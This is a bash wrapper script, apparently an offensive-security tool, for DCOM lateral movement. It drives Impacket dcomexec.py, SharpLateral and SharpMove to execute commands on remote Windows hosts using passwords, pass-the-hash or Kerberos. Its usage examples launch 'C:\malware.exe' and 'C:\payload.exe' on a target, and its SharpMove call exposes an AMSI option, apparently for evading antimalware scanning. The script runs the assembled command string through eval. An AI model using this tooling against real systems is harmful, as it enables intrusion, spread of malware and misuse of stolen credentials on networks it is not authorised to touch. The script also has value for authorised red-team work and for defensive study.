#!/bin/bash
# DCOM Lateral Movement Wrapper Script
# Provides a unified interface for DCOM-based lateral movement
# Requires Impacket and/or compiled binaries

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Print usage
usage() {
    echo -e "${BLUE}[*] DCOM Lateral Movement Wrapper${NC}"
    echo ""
    echo "Usage: $0 <command> [options]"
    echo ""
    echo "Commands:"
    echo "  dcomexec    Execute command via Impacket dcomexec.py"
    echo "  sharplateral Execute via SharpLateral (requires binary)"
    echo "  sharpmove   Execute via SharpMove (requires binary)"
    echo "  help        Show this help message"
    echo ""
    echo "Examples:"
    echo "  $0 dcomexec -u user -p pass -t 10.10.10.10 'whoami'"
    echo "  $0 sharplateral -t 10.10.10.10 -c 'C:\\malware.exe'"
    echo "  $0 sharpmove -t 10.10.10.10 -c 'C:\\payload.exe' -m ShellBrowserWindow"
    echo ""
    exit 1
}

# DCOMExec via Impacket
dcomexec() {
    local user=""
    local pass=""
    local target=""
    local command=""
    local domain=""
    local hashes=""
    local kerberos=false
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -u|--user)
                user="$2"
                shift 2
                ;;
            -p|--pass)
                pass="$2"
                shift 2
                ;;
            -t|--target)
                target="$2"
                shift 2
                ;;
            -c|--command)
                command="$2"
                shift 2
                ;;
            -d|--domain)
                domain="$2"
                shift 2
                ;;
            -h|--hashes)
                hashes="$2"
                shift 2
                ;;
            -k|--kerberos)
                kerberos=true
                shift
                ;;
            *)
                echo -e "${RED}[-] Unknown option: $1${NC}"
                usage
                ;;
        esac
    done
    
    if [[ -z "$target" || -z "$command" ]]; then
        echo -e "${RED}[-] Target and command are required${NC}"
        usage
    fi
    
    echo -e "${GREEN}[+] Executing dcomexec.py${NC}"
    echo -e "${BLUE}[*] Target: $target${NC}"
    echo -e "${BLUE}[*] Command: $command${NC}"
    
    # Build the command
    CMD="dcomexec.py"
    
    if [[ -n "$domain" && -n "$user" && -n "$pass" ]]; then
        CMD="$CMD '$domain'/'$user':'$pass'@'$target'"
    elif [[ -n "$hashes" && -n "$domain" && -n "$user" ]]; then
        CMD="$CMD -hashes $hashes '$domain'/'$user'@'$target'"
    elif [[ "$kerberos" == true && -n "$user" ]]; then
        CMD="$CMD -k -no-pass '$user'@'$target'"
    else
        echo -e "${RED}[-] Credentials required${NC}"
        exit 1
    fi
    
    CMD="$CMD \"$command\""
    
    echo -e "${YELLOW}[+] Running: $CMD${NC}"
    eval $CMD
}

# SharpLateral
sharplateral() {
    local target=""
    local command=""
    local method="reddcom"
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--target)
                target="$2"
                shift 2
                ;;
            -c|--command)
                command="$2"
                shift 2
                ;;
            -m|--method)
                method="$2"
                shift 2
                ;;
            *)
                echo -e "${RED}[-] Unknown option: $1${NC}"
                usage
                ;;
        esac
    done
    
    if [[ -z "$target" || -z "$command" ]]; then
        echo -e "${RED}[-] Target and command are required${NC}"
        usage
    fi
    
    echo -e "${GREEN}[+] Executing SharpLateral${NC}"
    echo -e "${BLUE}[*] Target: $target${NC}"
    echo -e "${BLUE}[*] Method: $method${NC}"
    echo -e "${BLUE}[*] Command: $command${NC}"
    
    if [[ ! -f "SharpLateral.exe" ]]; then
        echo -e "${RED}[-] SharpLateral.exe not found in current directory${NC}"
        echo -e "${YELLOW}[+] Download from: https://github.com/mertdas/SharpLateral${NC}"
        exit 1
    fi
    
    ./SharpLateral.exe $method $target $command
}

# SharpMove
sharpmove() {
    local target=""
    local command=""
    local method="ShellBrowserWindow"
    local amsi="true"
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--target)
                target="$2"
                shift 2
                ;;
            -c|--command)
                command="$2"
                shift 2
                ;;
            -m|--method)
                method="$2"
                shift 2
                ;;
            -a|--amsi)
                amsi="$2"
                shift 2
                ;;
            *)
                echo -e "${RED}[-] Unknown option: $1${NC}"
                usage
                ;;
        esac
    done
    
    if [[ -z "$target" || -z "$command" ]]; then
        echo -e "${RED}[-] Target and command are required${NC}"
        usage
    fi
    
    echo -e "${GREEN}[+] Executing SharpMove${NC}"
    echo -e "${BLUE}[*] Target: $target${NC}"
    echo -e "${BLUE}[*] Method: $method${NC}"
    echo -e "${BLUE}[*] AMSI: $amsi${NC}"
    echo -e "${BLUE}[*] Command: $command${NC}"
    
    if [[ ! -f "SharpMove.exe" ]]; then
        echo -e "${RED}[-] SharpMove.exe not found in current directory${NC}"
        echo -e "${YELLOW}[+] Download from: https://github.com/0xthirteen/SharpMove${NC}"
        exit 1
    fi
    
    ./SharpMove.exe action=dcom computername=$target command="$command" method=$method amsi=$amsi
}

# Main command dispatcher
case "${1:-}" in
    dcomexec)
        shift
        dcomexec "$@"
        ;;
    sharplateral)
        shift
        sharplateral "$@"
        ;;
    sharpmove)
        shift
        sharpmove "$@"
        ;;
    help|--help|-h)
        usage
        ;;
    *)
        echo -e "${RED}[-] Unknown command: ${1:-}${NC}"
        usage
        ;;
esac
